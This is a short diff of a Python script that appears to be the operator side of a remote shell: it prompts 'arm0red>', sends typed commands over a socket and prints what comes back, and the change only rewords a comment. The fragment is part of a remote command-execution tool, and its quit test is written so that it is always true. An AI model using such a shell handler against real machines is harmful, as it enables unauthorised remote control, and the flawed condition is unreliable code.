@@ -18,7 +18,7 @@ try:
         command = input("arm0red> ") # Enter shell command.
         conn.send(bytes(command, "UTF-8")) # Send shell command.
         if command == "quit" or "exit":
-            break # If we specify quit then break out of loop and close socket.
+            break # If we specify 'quit' or 'exit', then break out of loop and close socket.
         data = conn.recv(1024).decode("UTF-8") # Receive output from command.
         print(data) # Print the output of the command.
 except KeyboardInterrupt: 
